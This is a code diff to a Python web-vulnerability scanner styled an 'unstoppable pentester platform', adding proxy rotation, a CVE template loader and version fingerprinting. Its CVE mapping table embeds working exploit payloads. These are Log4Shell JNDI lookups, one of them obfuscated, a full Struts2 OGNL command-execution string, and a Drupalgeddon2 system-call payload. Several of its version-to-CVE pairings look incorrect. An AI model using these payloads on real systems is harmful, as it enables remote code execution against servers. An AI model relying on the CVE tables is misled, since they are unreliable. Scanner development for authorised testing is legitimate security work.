@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ULTRA-DAST v15.2 – The Unstoppable Pentester Platform
+ULTRA-DAST v16.0 – The Unstoppable Pentester Platform
 Full implementation with async engine, advanced evasion, second-order injection,
 race conditions, request smuggling, WebSocket/gRPC fuzzing, CVSS 4.0, Burp XML,
 JIRA/Slack alerts, multi‑tab GUI, proxy mode, FP learning, and more.
@@ -21,6 +21,9 @@ PROXY POOL CONFIGURATION EXAMPLE:
         "health_check_interval": 300,
         "prefer_geo_diverse": true,
         "max_failure_rate": 0.5,
+        "auto_healing_enabled": true,
+        "sticky_session_enabled": false,
+        "sticky_session_duration": 600,
         "proxies": [
             {
                 "url": "proxy1.example.com:8080",
@@ -70,6 +73,8 @@ PROXY POOL FEATURES:
 - Configurable rotation intervals
 - Automatic fallback to healthy proxies
 - Integration with both aiohttp and Selenium
+- Auto-healing: Dynamic max_failure_rate adjustment when >80% of proxies fail within 60 seconds
+- Sticky sessions: Maintain same IP during multi-step operations (e.g., Add-to-Cart -> Checkout)
 
 USAGE:
 1. Use the GUI Proxy Pool tab to configure proxies interactively
@@ -395,6 +400,7 @@ import secrets
 import multiprocessing
 from multiprocessing import Queue, Manager, Process
 import aiohttp
+import glob
 
 # Optional interactsh import with fallback
 # Note: interactsh packages have compatibility issues with Python 3.10.6
@@ -419,7 +425,8 @@ sys.setrecursionlimit(10000)
 from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QFormLayout, 
                              QPushButton, QLabel, QLineEdit, QPlainTextEdit, 
                              QComboBox, QGroupBox, QTabWidget, QTableWidget, 
-                             QTableWidgetItem, QMessageBox, QFileDialog, QSplitter, QDockWidget)
+                             QTableWidgetItem, QMessageBox, QFileDialog, QSplitter, QDockWidget,
+                             QCheckBox, QSpinBox, QDoubleSpinBox, QHeaderView)
 from PyQt5.QtCore import Qt, QThread
 from PyQt5.QtGui import QFont, QSyntaxHighlighter, QTextCharFormat, QColor, QTextDocument, QPalette
 
@@ -1266,6 +1273,946 @@ class DeepOSFingerprinter:
         self.fingerprint_cache.clear()
 
 
+class CVETemplateEngine:
+    """
+    Plugin/Template Engine for CVE detection (Nuclei-style integration).
+    
+    Allows users to drop YAML/JSON files defining CVEs with:
+    - Request headers and body
+    - Detection regex patterns
+    - Version requirements
+    - Severity and CVSS scores
+    
+    This makes the scanner infinitely extensible without code changes.
+    """
+    
+    def __init__(self, template_directory=None):
+        self.template_directory = template_directory or os.path.join(os.path.dirname(__file__), 'cve_templates')
+        self.templates = {}
+        self.template_cache = {}
+        self._ensure_template_directory()
+        self._load_templates()
+        
+    def _ensure_template_directory(self):
+        """Ensure the template directory exists."""
+        if not os.path.exists(self.template_directory):
+            os.makedirs(self.template_directory)
+            logging.info(f"Created CVE template directory: {self.template_directory}")
+            
+    def _load_templates(self):
+        """Load all CVE templates from the template directory."""
+        self.templates = {}
+        
+        # Load YAML templates
+        yaml_files = []
+        try:
+            yaml_files = glob.glob(os.path.join(self.template_directory, '*.yaml'))
+            yaml_files.extend(glob.glob(os.path.join(self.template_directory, '*.yml')))
+        except Exception as e:
+            logging.warning(f"Error searching for YAML templates: {e}")
+        
+        # Load JSON templates
+        json_files = []
+        try:
+            json_files = glob.glob(os.path.join(self.template_directory, '*.json'))
+        except Exception as e:
+            logging.warning(f"Error searching for JSON templates: {e}")
+        
+        for template_file in yaml_files + json_files:
+            try:
+                template = self._load_template_file(template_file)
+                if template:
+                    cve_id = template.get('id', template.get('cve_id', os.path.basename(template_file)))
+                    self.templates[cve_id] = template
+                    logging.info(f"Loaded CVE template: {cve_id} from {template_file}")
+            except Exception as e:
+                logging.error(f"Failed to load template {template_file}: {e}")
+                
+        logging.info(f"Loaded {len(self.templates)} CVE templates")
+        
+    def _load_template_file(self, file_path):
+        """Load a single template file (YAML or JSON)."""
+        file_ext = os.path.splitext(file_path)[1].lower()
+        
+        try:
+            with open(file_path, 'r', encoding='utf-8') as f:
+                if file_ext in ['.yaml', '.yml']:
+                    import yaml
+                    return yaml.safe_load(f)
+                elif file_ext == '.json':
+                    import json
+                    return json.load(f)
+                else:
+                    logging.warning(f"Unsupported template format: {file_ext}")
+                    return None
+        except ImportError as e:
+            logging.error(f"Missing required library for template loading: {e}")
+            return None
+        except Exception as e:
+            logging.error(f"Error loading template file {file_path}: {e}")
+            return None
+            
+    def add_template(self, template_dict, template_id=None):
+        """
+        Add a template programmatically.
+        
+        Args:
+            template_dict: Dictionary containing template definition
+            template_id: Optional template ID (uses template['id'] if not provided)
+        """
+        template_id = template_id or template_dict.get('id', template_dict.get('cve_id'))
+        if template_id:
+            self.templates[template_id] = template_dict
+            logging.info(f"Added CVE template: {template_id}")
+            
+    def get_template(self, template_id):
+        """Get a specific template by ID."""
+        return self.templates.get(template_id)
+        
+    def get_templates_by_software(self, software_name):
+        """Get all templates for a specific software."""
+        matching_templates = {}
+        for template_id, template in self.templates.items():
+            if template.get('software', '').lower() == software_name.lower():
+                matching_templates[template_id] = template
+        return matching_templates
+        
+    def get_templates_by_severity(self, severity):
+        """Get all templates with a specific severity level."""
+        severity = severity.upper()
+        matching_templates = {}
+        for template_id, template in self.templates.items():
+            if template.get('severity', '').upper() == severity:
+                matching_templates[template_id] = template
+        return matching_templates
+        
+    def validate_template(self, template):
+        """
+        Validate a template structure.
+        
+        Returns:
+            tuple: (is_valid, error_message)
+        """
+        required_fields = ['id', 'name', 'severity']
+        
+        for field in required_fields:
+            if field not in template:
+                return False, f"Missing required field: {field}"
+                
+        # Validate severity
+        valid_severities = ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW', 'INFO']
+        if template.get('severity', '').upper() not in valid_severities:
+            return False, f"Invalid severity: {template.get('severity')}"
+            
+        # Validate requests if present
+        if 'requests' in template:
+            if not isinstance(template['requests'], list):
+                return False, "Requests must be a list"
+                
+            for request in template['requests']:
+                if 'method' not in request or 'path' not in request:
+                    return False, "Each request must have 'method' and 'path'"
+                    
+        return True, None
+        
+    def generate_detection_request(self, template_id, base_url, parameters=None):
+        """
+        Generate detection request parameters from a template.
+        
+        Args:
+            template_id: Template identifier
+            base_url: Target base URL
+            parameters: Optional parameters to substitute in template
+            
+        Returns:
+            dict: Request parameters (method, url, headers, body, etc.)
+        """
+        template = self.get_template(template_id)
+        if not template:
+            return None
+            
+        if 'requests' not in template or not template['requests']:
+            return None
+            
+        # Use the first request from the template
+        request_config = template['requests'][0]
+        
+        # Build the full URL
+        path = request_config.get('path', '/')
+        url = urljoin(base_url, path)
+        
+        # Substitute parameters if provided
+        if parameters:
+            for param_key, param_value in parameters.items():
+                url = url.replace(f'{{{param_key}}}', str(param_value))
+                
+        # Build request parameters
+        request_params = {
+            'method': request_config.get('method', 'GET'),
+            'url': url,
+            'headers': request_config.get('headers', {}),
+            'body': request_config.get('body', None),
+            'cookies': request_config.get('cookies', {}),
+        }
+        
+        # Add query parameters if present
+        if 'query_parameters' in request_config:
+            query_params = request_config['query_parameters']
+            if parameters:
+                # Substitute parameters in query values
+                for key, value in query_params.items():
+                    if isinstance(value, str):
+                        for param_key, param_value in parameters.items():
+                            value = value.replace(f'{{{param_key}}}', str(param_value))
+                        query_params[key] = value
+            request_params['params'] = query_params
+            
+        return request_params
+        
+    def check_detection_patterns(self, template_id, response_content, response_headers, status_code):
+        """
+        Check if response matches detection patterns from template.
+        
+        Args:
+            template_id: Template identifier
+            response_content: Response body content
+            response_headers: Response headers
+            status_code: HTTP status code
+            
+        Returns:
+            tuple: (is_detected, matched_patterns, confidence)
+        """
+        template = self.get_template(template_id)
+        if not template:
+            return False, [], 0
+            
+        matched_patterns = []
+        confidence = 0
+        
+        # Check status code if specified
+        if 'status_code' in template:
+            expected_status = template['status_code']
+            if isinstance(expected_status, list):
+                if status_code in expected_status:
+                    matched_patterns.append(f"status_code:{status_code}")
+                    confidence += 0.3
+            elif status_code == expected_status:
+                matched_patterns.append(f"status_code:{status_code}")
+                confidence += 0.3
+                
+        # Check content patterns
+        if 'matchers' in template:
+            for matcher in template['matchers']:
+                matcher_type = matcher.get('type', 'word')
+                
+                if matcher_type == 'word':
+                    # Word matching
+                    words = matcher.get('words', [])
+                    for word in words:
+                        if word in response_content:
+                            matched_patterns.append(f"word:{word}")
+                            confidence += 0.2
+                            
+                elif matcher_type == 'regex':
+                    # Regex matching
+                    patterns = matcher.get('regex', [])
+                    for pattern in patterns:
+                        try:
+                            if re.search(pattern, response_content, re.IGNORECASE):
+                                matched_patterns.append(f"regex:{pattern}")
+                                confidence += 0.4
+                        except re.error:
+                            logging.warning(f"Invalid regex pattern: {pattern}")
+                            
+                elif matcher_type == 'binary':
+                    # Binary matching
+                    binaries = matcher.get('binary', [])
+                    for binary in binaries:
+                        if binary.encode() in response_content.encode():
+                            matched_patterns.append(f"binary:{binary}")
+                            confidence += 0.3
+                            
+                elif matcher_type == 'status':
+                    # Status code matching
+                    expected_status = matcher.get('status')
+                    if status_code == expected_status:
+                        matched_patterns.append(f"matcher_status:{status_code}")
+                        confidence += 0.5
+                        
+        # Check header patterns
+        if 'header_matchers' in template:
+            for header_matcher in template['header_matchers']:
+                header_name = header_matcher.get('name')
+                expected_value = header_matcher.get('value')
+                
+                if header_name in response_headers:
+                    actual_value = response_headers[header_name]
+                    if expected_value in actual_value:
+                        matched_patterns.append(f"header:{header_name}")
+                        confidence += 0.3
+                        
+        # Normalize confidence to 0-100 range
+        confidence = min(confidence * 100, 100)
+        
+        is_detected = confidence >= (template.get('confidence_threshold', 50))
+        
+        return is_detected, matched_patterns, confidence
+        
+    def create_sample_template(self, cve_id, software, name, severity, description):
+        """
+        Create a sample CVE template structure.
+        
+        Args:
+            cve_id: CVE identifier (e.g., CVE-2024-1234)
+            software: Affected software name
+            name: Template name
+            severity: Severity level (CRITICAL, HIGH, MEDIUM, LOW)
+            description: Vulnerability description
+            
+        Returns:
+            dict: Sample template structure
+        """
+        return {
+            'id': cve_id,
+            'info': {
+                'name': name,
+                'severity': severity,
+                'description': description,
+                'author': 'Auto-generated',
+                'software': software
+            },
+            'requests': [
+                {
+                    'method': 'GET',
+                    'path': '/vulnerable-endpoint',
+                    'headers': {
+                        'User-Agent': 'Scanner-UA'
+                    },
+                    'query_parameters': {
+                        'param1': 'test_value'
+                    }
+                }
+            ],
+            'matchers': [
+                {
+                    'type': 'regex',
+                    'regex': [
+                        r'vulnerability_pattern_1',
+                        r'vulnerability_pattern_2'
+                    ]
+                },
+                {
+                    'type': 'word',
+                    'words': [
+                        'error_message',
+                        'vulnerable_component'
+                    ]
+                }
+            ],
+            'severity': severity,
+            'confidence_threshold': 70
+        }
+        
+    def save_template(self, template, filename=None):
+        """
+        Save a template to a file.
+        
+        Args:
+            template: Template dictionary
+            filename: Optional filename (uses template ID if not provided)
+        """
+        if not filename:
+            template_id = template.get('id', template.get('cve_id', 'template'))
+            filename = f"{template_id}.yaml"
+            
+        file_path = os.path.join(self.template_directory, filename)
+        
+        try:
+            with open(file_path, 'w', encoding='utf-8') as f:
+                import yaml
+                yaml.dump(template, f, default_flow_style=False)
+            logging.info(f"Saved template to: {file_path}")
+            return True
+        except ImportError:
+            # Fallback to JSON if YAML is not available
+            with open(file_path.replace('.yaml', '.json'), 'w', encoding='utf-8') as f:
+                import json
+                json.dump(template, f, indent=2)
+            logging.info(f"Saved template to JSON: {file_path}")
+            return True
+        except Exception as e:
+            logging.error(f"Failed to save template: {e}")
+            return False
+
+
+class VersionDetectionEngine:
+    """
+    Software version detection and CVE signature database.
+    Enables intelligent version-based vulnerability testing instead of blind payload injection.
+    
+    Now integrated with CVETemplateEngine for extensible template-based detection.
+    """
+    
+    def __init__(self, template_directory=None):
+        self.version_cache = {}
+        self.software_signatures = self._build_software_signatures()
+        self.cve_version_mappings = self._build_cve_version_mappings()
+        self.template_engine = CVETemplateEngine(template_directory)
+        
+    def _build_software_signatures(self):
+        """
+        Build comprehensive software version signature database.
+        Maps software patterns to version detection methods.
+        """
+        return {
+            # Web Server signatures
+            'nginx': {
+                'header_patterns': [r'Server: nginx/(\d+\.\d+\.\d+)', r'X-Powered-By: nginx/(\d+\.\d+\.\d+)'],
+                'html_patterns': [r'nginx/(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'nginx.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [],
+                'known_vulnerable_versions': {
+                    '0.6.18': 'CVE-2009-2629',
+                    '0.7.61': 'CVE-2009-4487',
+                    '0.8.41': 'CVE-2010-2266',
+                    '1.0.0': 'CVE-2011-3115',
+                    '1.4.0': 'CVE-2013-2028',
+                    '1.5.0': 'CVE-2016-0752',
+                    '1.6.0': 'CVE-2017-7529',
+                    '1.18.0': 'CVE-2021-23017'
+                }
+            },
+            'apache': {
+                'header_patterns': [r'Server: Apache/(\d+\.\d+\.\d+)', r'Server: Apache-Coyote/(\d+\.\d+\.\d+)'],
+                'html_patterns': [r'Apache/(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'apache.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [],
+                'known_vulnerable_versions': {
+                    '2.2.0': 'CVE-2009-1191',
+                    '2.2.15': 'CVE-2010-0425',
+                    '2.4.0': 'CVE-2012-0031',
+                    '2.4.20': 'CVE-2014-0118',
+                    '2.4.25': 'CVE-2016-4975',
+                    '2.4.29': 'CVE-2017-15710',
+                    '2.4.48': 'CVE-2021-41773'
+                }
+            },
+            # Java signatures
+            'log4j': {
+                'header_patterns': [],
+                'html_patterns': [r'log4j.*?(\d+\.\d+\.\d+)', r'log4j-core.*?(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'log4j.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [],
+                'known_vulnerable_versions': {
+                    '2.0-beta9': 'CVE-2011-4314',
+                    '2.0-beta8': 'CVE-2011-4314',
+                    '2.14.0': 'CVE-2021-44228',
+                    '2.14.1': 'CVE-2021-44228',
+                    '2.15.0': 'CVE-2021-45046',
+                    '2.16.0': 'CVE-2021-44228',
+                    '2.17.0': 'CVE-2021-45105',
+                    '2.17.1': 'CVE-2022-22965'
+                },
+                'safe_versions': ['2.17.2', '2.18.0', '2.19.0', '2.20.0']
+            },
+            'spring': {
+                'header_patterns': [r'X-Application-Context:.*?spring.*?(\d+\.\d+\.\d+)'],
+                'html_patterns': [r'spring.*?(\d+\.\d+\.\d+)', r'springframework.*?(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'spring.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [],
+                'known_vulnerable_versions': {
+                    '4.1.0': 'CVE-2015-5211',
+                    '4.2.0': 'CVE-2016-6654',
+                    '4.3.0': 'CVE-2017-8046',
+                    '5.0.0': 'CVE-2018-1270',
+                    '5.1.0': 'CVE-2018-1271',
+                    '5.2.0': 'CVE-2020-5398',
+                    '5.3.0': 'CVE-2021-22118'
+                }
+            },
+            # PHP signatures
+            'php': {
+                'header_patterns': [r'X-Powered-By: PHP/(\d+\.\d+\.\d+)', r'Server:.*?PHP/(\d+\.\d+\.\d+)'],
+                'html_patterns': [r'PHP/(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'php.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [r'PHPSESSID'],
+                'known_vulnerable_versions': {
+                    '5.3.0': 'CVE-2012-1823',
+                    '5.4.0': 'CVE-2014-0231',
+                    '5.5.0': 'CVE-2015-0231',
+                    '5.6.0': 'CVE-2016-5773',
+                    '7.0.0': 'CVE-2016-5773',
+                    '7.1.0': 'CVE-2017-5630',
+                    '7.2.0': 'CVE-2018-17082',
+                    '7.3.0': 'CVE-2019-11043',
+                    '7.4.0': 'CVE-2020-7064',
+                    '8.0.0': 'CVE-2021-21705'
+                }
+            },
+            # Node.js signatures
+            'nodejs': {
+                'header_patterns': [r'X-Powered-By: Express', r'Server: Node.js'],
+                'html_patterns': [r'node.*?(\d+\.\d+\.\d+)', r'express.*?(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'node.*?(\d+\.\d+\.\d+)', r'express.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [],
+                'known_vulnerable_versions': {
+                    '0.10.0': 'CVE-2013-4450',
+                    '0.12.0': 'CVE-2015-0277',
+                    '4.0.0': 'CVE-2015-6764',
+                    '6.0.0': 'CVE-2016-5325',
+                    '8.0.0': 'CVE-2017-14849',
+                    '10.0.0': 'CVE-2018-7164',
+                    '12.0.0': 'CVE-2019-15604',
+                    '14.0.0': 'CVE-2020-8265',
+                    '16.0.0': 'CVE-2021-22918'
+                }
+            },
+            # Database signatures
+            'mysql': {
+                'header_patterns': [r'Server: MySQL/(\d+\.\d+\.\d+)'],
+                'html_patterns': [r'mysql.*?(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'mysql.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [],
+                'known_vulnerable_versions': {
+                    '5.0.0': 'CVE-2012-1689',
+                    '5.1.0': 'CVE-2012-1689',
+                    '5.5.0': 'CVE-2016-6664',
+                    '5.6.0': 'CVE-2016-6664',
+                    '5.7.0': 'CVE-2017-3302',
+                    '8.0.0': 'CVE-2018-3174'
+                }
+            },
+            'postgresql': {
+                'header_patterns': [r'Server: PostgreSQL/(\d+\.\d+\.\d+)'],
+                'html_patterns': [r'postgresql.*?(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'postgresql.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [],
+                'known_vulnerable_versions': {
+                    '9.0.0': 'CVE-2013-0255',
+                    '9.1.0': 'CVE-2013-0255',
+                    '9.2.0': 'CVE-2013-0255',
+                    '9.3.0': 'CVE-2013-0255',
+                    '9.4.0': 'CVE-2016-0766',
+                    '9.5.0': 'CVE-2016-0766',
+                    '9.6.0': 'CVE-2017-7485',
+                    '10.0.0': 'CVE-2017-7485',
+                    '11.0.0': 'CVE-2019-10224'
+                }
+            },
+            # Framework signatures
+            'django': {
+                'header_patterns': [r'Server:.*?Django/(\d+\.\d+\.\d+)'],
+                'html_patterns': [r'django.*?(\d+\.\d+\.\d+)', r'csrfmiddlewaretoken'],
+                'js_patterns': [r'django.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [r'csrftoken'],
+                'known_vulnerable_versions': {
+                    '1.2.0': 'CVE-2011-4140',
+                    '1.3.0': 'CVE-2012-4522',
+                    '1.4.0': 'CVE-2013-0306',
+                    '1.5.0': 'CVE-2013-4602',
+                    '1.6.0': 'CVE-2014-0474',
+                    '1.7.0': 'CVE-2015-5144',
+                    '1.8.0': 'CVE-2016-9013',
+                    '1.9.0': 'CVE-2017-12794',
+                    '2.0.0': 'CVE-2019-19844',
+                    '2.1.0': 'CVE-2019-19844',
+                    '2.2.0': 'CVE-2020-9402',
+                    '3.0.0': 'CVE-2020-9402'
+                }
+            },
+            'rails': {
+                'header_patterns': [r'X-Powered-By: Phusion Passenger', r'Server:.*?Rails'],
+                'html_patterns': [r'rails.*?(\d+\.\d+\.\d+)', r'csrf-param'],
+                'js_patterns': [r'rails.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [r'_session'],
+                'known_vulnerable_versions': {
+                    '2.3.0': 'CVE-2011-2930',
+                    '3.0.0': 'CVE-2011-2931',
+                    '3.1.0': 'CVE-2011-2931',
+                    '3.2.0': 'CVE-2012-2660',
+                    '4.0.0': 'CVE-2013-0155',
+                    '4.1.0': 'CVE-2014-0130',
+                    '4.2.0': 'CVE-2015-3226',
+                    '5.0.0': 'CVE-2016-0753',
+                    '5.1.0': 'CVE-2017-16726',
+                    '5.2.0': 'CVE-2019-5418',
+                    '6.0.0': 'CVE-2020-8165'
+                }
+            },
+            # CMS signatures
+            'wordpress': {
+                'header_patterns': [r'X-Powered-By: WordPress/(\d+\.\d+\.\d+)'],
+                'html_patterns': [r'wp-content', r'wp-includes', r'generator" content="WordPress (\d+\.\d+\.\d+)'],
+                'js_patterns': [r'wp-.*?(\d+\.\d+\.\d+)', r'wordpress.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [r'wordpress'],
+                'known_vulnerable_versions': {
+                    '3.0.0': 'CVE-2011-4897',
+                    '3.5.0': 'CVE-2012-6632',
+                    '3.6.0': 'CVE-2013-4338',
+                    '3.7.0': 'CVE-2013-4338',
+                    '3.8.0': 'CVE-2014-0165',
+                    '3.9.0': 'CVE-2014-8867',
+                    '4.0.0': 'CVE-2015-3429',
+                    '4.1.0': 'CVE-2015-3429',
+                    '4.2.0': 'CVE-2015-5623',
+                    '4.3.0': 'CVE-2015-5714',
+                    '4.4.0': 'CVE-2016-6835',
+                    '4.5.0': 'CVE-2016-6835',
+                    '4.6.0': 'CVE-2016-6835',
+                    '4.7.0': 'CVE-2017-8295',
+                    '4.8.0': 'CVE-2017-8295',
+                    '4.9.0': 'CVE-2018-8371',
+                    '5.0.0': 'CVE-2019-9787',
+                    '5.1.0': 'CVE-2019-9787',
+                    '5.2.0': 'CVE-2019-9978',
+                    '5.3.0': 'CVE-2019-9978',
+                    '5.4.0': 'CVE-2020-28040',
+                    '5.5.0': 'CVE-2020-28040',
+                    '5.6.0': 'CVE-2021-24162',
+                    '5.7.0': 'CVE-2021-24162',
+                    '5.8.0': 'CVE-2021-24162'
+                }
+            },
+            'drupal': {
+                'header_patterns': [r'X-Drupal-Cache', r'X-Generator: Drupal'],
+                'html_patterns': [r'drupal\.js', r'generator" content="Drupal (\d+\.\d+\.\d+)'],
+                'js_patterns': [r'drupal.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [r'SESS'],
+                'known_vulnerable_versions': {
+                    '6.0.0': 'CVE-2012-1583',
+                    '7.0.0': 'CVE-2012-1583',
+                    '7.14.0': 'CVE-2014-3704',
+                    '7.31.0': 'CVE-2014-3704',
+                    '8.0.0': 'CVE-2015-5345',
+                    '8.1.0': 'CVE-2015-5345',
+                    '8.2.0': 'CVE-2016-4404',
+                    '8.3.0': 'CVE-2016-4404',
+                    '8.4.0': 'CVE-2017-6926',
+                    '8.5.0': 'CVE-2017-6926',
+                    '8.6.0': 'CVE-2018-7600',
+                    '8.7.0': 'CVE-2018-7600',
+                    '8.8.0': 'CVE-2018-7600',
+                    '9.0.0': 'CVE-2019-6342',
+                    '9.1.0': 'CVE-2019-6342',
+                    '9.2.0': 'CVE-2020-13668',
+                    '9.3.0': 'CVE-2020-13668'
+                }
+            },
+            # Tomcat signatures
+            'tomcat': {
+                'header_patterns': [r'Server: Apache-Coyote/(\d+\.\d+\.\d+)', r'Server: Tomcat'],
+                'html_patterns': [r'tomcat.*?(\d+\.\d+\.\d+)', r'apache-tomcat.*?(\d+\.\d+\.\d+)'],
+                'js_patterns': [r'tomcat.*?(\d+\.\d+\.\d+)'],
+                'cookie_patterns': [r'JSESSIONID'],
+                'known_vulnerable_versions': {
+                    '6.0.0': 'CVE-2009-0033',
+                    '7.0.0': 'CVE-2011-2204',
+                    '7.0.26': 'CVE-2012-0022',
+                    '8.0.0': 'CVE-2014-0075',
+                    '8.5.0': 'CVE-2016-3092',
+                    '8.5.31': 'CVE-2017-5648',
+                    '9.0.0': 'CVE-2017-5648',
+                    '9.0.0.M1': 'CVE-2019-0199',
+                    '9.0.1': 'CVE-2019-0199',
+                    '9.0.10': 'CVE-2019-0199',
+                    '9.0.26': 'CVE-2020-9484',
+                    '10.0.0': 'CVE-2020-9484'
+                }
+            }
+        }
+    
+    def _build_cve_version_mappings(self):
+        """
+        Build CVE-to-version mappings for intelligent payload selection.
+        Maps CVE IDs to affected version ranges and recommended payloads.
+        """
+        return {
+            'CVE-2021-44228': {
+                'software': 'log4j',
+                'affected_versions': ['2.0-beta9', '2.14.1'],
+                'safe_versions': ['2.17.2', '2.18.0', '2.19.0', '2.20.0'],
+                'recommended_payloads': [
+                    '${jndi:ldap://OOB_MARKER}',
+                    '${jndi:rmi://OOB_MARKER/exploit}',
+                    '${${lower:j}ndi:${lower:l}dap://OOB_MARKER}'
+                ],
+                'severity': 'CRITICAL',
+                'cvss_score': 10.0
+            },
+            'CVE-2021-45046': {
+                'software': 'log4j',
+                'affected_versions': ['2.15.0', '2.16.0'],
+                'safe_versions': ['2.17.2', '2.18.0'],
+                'recommended_payloads': [
+                    '${jndi:ldap://OOB_MARKER}',
+                    '${jndi:rmi://OOB_MARKER/exploit}'
+                ],
+                'severity': 'CRITICAL',
+                'cvss_score': 9.0
+            },
+            'CVE-2021-45105': {
+                'software': 'log4j',
+                'affected_versions': ['2.17.0'],
+                'safe_versions': ['2.17.2', '2.18.0'],
+                'recommended_payloads': [
+                    '${jndi:ldap://OOB_MARKER/ClassName}'
+                ],
+                'severity': 'HIGH',
+                'cvss_score': 7.5
+            },
+            'CVE-2017-5638': {
+                'software': 'struts2',
+                'affected_versions': ['2.3.5', '2.3.31', '2.5.0', '2.5.10'],
+                'safe_versions': ['2.3.32', '2.5.12'],
+                'recommended_payloads': [
+                    '%{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'CMD_INJECTION\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}'
+                ],
+                'severity': 'CRITICAL',
+                'cvss_score': 10.0
+            },
+            'CVE-2018-7600': {
+                'software': 'drupal',
+                'affected_versions': ['6', '7', '8'],
+                'safe_versions': ['6.38', '7.59', '8.5.1'],
+                'recommended_payloads': [
+                    'form_id=user_register_form&mail[#post_render][]=system&mail[#type]=markup&mail[#markup]=CMD_INJECTION'
+                ],
+                'severity': 'CRITICAL',
+                'cvss_score': 10.0
+            },
+            'CVE-2019-0199': {
+                'software': 'tomcat',
+                'affected_versions': ['9.0.0.M1', '9.0.10'],
+                'safe_versions': ['9.0.11'],
+                'recommended_payloads': [
+                    'AJP_HOST_INJECTION'
+                ],
+                'severity': 'HIGH',
+                'cvss_score': 7.5
+            },
+            'CVE-2020-9484': {
+                'software': 'tomcat',
+                'affected_versions': ['9.0.0', '9.0.26'],
+                'safe_versions': ['9.0.27'],
+                'recommended_payloads': [
+                    'SESSION_DESERIALIZATION_PAYLOAD'
+                ],
+                'severity': 'HIGH',
+                'cvss_score': 7.5
+            }
+        }
+    
+    def detect_software_versions(self, headers, html_content, js_content, cookies):
+        """
+        Detect software versions from various sources.
+        
+        Args:
+            headers: HTTP response headers
+            html_content: HTML content
+            js_content: JavaScript content
+            cookies: Response cookies
+            
+        Returns:
+            dict: Detected software with versions and CVEs
+        """
+        detected = {}
+        
+        for software_name, signatures in self.software_signatures.items():
+            version = None
+            detection_source = None
+            
+            # Check headers
+            if not version and signatures['header_patterns']:
+                for pattern in signatures['header_patterns']:
+                    match = re.search(pattern, str(headers), re.IGNORECASE)
+                    if match:
+                        version = match.group(1)
+                        detection_source = 'header'
+                        break
+            
+            # Check HTML
+            if not version and signatures['html_patterns']:
+                for pattern in signatures['html_patterns']:
+                    match = re.search(pattern, html_content, re.IGNORECASE)
+                    if match:
+                        version = match.group(1) if match.groups() else 'detected'
+                        detection_source = 'html'
+                        break
+            
+            # Check JavaScript
+            if not version and signatures['js_patterns'] and js_content:
+                for pattern in signatures['js_patterns']:
+                    match = re.search(pattern, js_content, re.IGNORECASE)
+                    if match:
+                        version = match.group(1) if match.groups() else 'detected'
+                        detection_source = 'javascript'
+                        break
+            
+            # Check cookies
+            if not version and signatures['cookie_patterns'] and cookies:
+                for pattern in signatures['cookie_patterns']:
+                    for cookie_name, cookie_value in cookies.items():
+                        if re.search(pattern, cookie_name, re.IGNORECASE):
+                            version = 'detected'
+                            detection_source = 'cookie'
+                            break
+                    if version:
+                        break
+            
+            if version:
+                cves = self._get_cves_for_version(software_name, version)
+                detected[software_name] = {
+                    'version': version,
+                    'detection_source': detection_source,
+                    'cves': cves,
+                    'is_vulnerable': len(cves) > 0,
+                    'known_safe': version in signatures.get('safe_versions', [])
+                }
+        
+        return detected
+    
+    def _get_cves_for_version(self, software_name, version):
+        """
+        Get applicable CVEs for a specific software version.
+        
+        Args:
+            software_name: Name of the software
+            version: Detected version
+            
+        Returns:
+            list: Applicable CVEs with details
+        """
+        cves = []
+        signatures = self.software_signatures.get(software_name, {})
+        known_vulnerable = signatures.get('known_vulnerable_versions', {})
+        
+        # Check if this exact version is known to be vulnerable
+        if version in known_vulnerable:
+            cve_id = known_vulnerable[version]
+            cve_mapping = self.cve_version_mappings.get(cve_id, {})
+            cves.append({
+                'cve_id': cve_id,
+                'severity': cve_mapping.get('severity', 'UNKNOWN'),
+                'cvss_score': cve_mapping.get('cvss_score', 0.0),
+                'recommended_payloads': cve_mapping.get('recommended_payloads', [])
+            })
+        
+        # Check CVE mappings for version ranges
+        for cve_id, cve_data in self.cve_version_mappings.items():
+            if cve_data.get('software') == software_name:
+                affected_versions = cve_data.get('affected_versions', [])
+                if self._is_version_affected(version, affected_versions):
+                    cves.append({
+                        'cve_id': cve_id,
+                        'severity': cve_data.get('severity', 'UNKNOWN'),
+                        'cvss_score': cve_data.get('cvss_score', 0.0),
+                        'recommended_payloads': cve_data.get('recommended_payloads', [])
+                    })
+        
+        return cves
+    
